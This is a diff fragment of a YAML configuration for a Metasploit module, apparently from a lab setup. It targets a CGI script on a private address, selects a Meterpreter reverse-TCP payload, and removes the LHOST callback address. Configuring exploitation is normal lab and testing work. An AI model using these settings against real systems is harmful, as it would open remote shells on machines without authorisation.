@@ -10,6 +10,3 @@ metasploit_module:
         var: http://192.168.33.10/cgi-bin/test.cgi
       - name: PAYLOAD
         var: linux/x86/meterpreter/reverse_tcp
-      - name: LHOST
-        var: 192.168.33.77
-
